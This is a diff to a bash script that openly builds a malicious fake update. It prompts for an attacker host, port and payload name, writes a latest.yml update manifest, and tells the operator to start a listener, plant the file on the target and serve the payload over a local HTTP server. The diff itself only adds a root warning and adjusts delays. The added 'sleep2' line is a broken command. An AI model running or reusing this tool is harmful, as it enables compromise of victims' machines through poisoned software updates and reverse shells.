@@ -1,5 +1,6 @@
 #!/bin/bash
-
+echo "You may need run the script as root or have extra permissions"
+sleep2
 read -e -p "LHOST=" LHOST
 read -e -p "LPORT=" LPORT
 read -e -p "Choose name=" PAYLOAD
@@ -14,7 +15,7 @@ releaseDate: '$(date --utc +%FT%T.%3NZ)'
 EOF
 
 echo "Run your lisner on the port $LPORT you specified"
-sleep 1
+sleep 2
 echo "Upload latest.yml to the target and wait"
 sleep 3
 python3 -m http.server 80
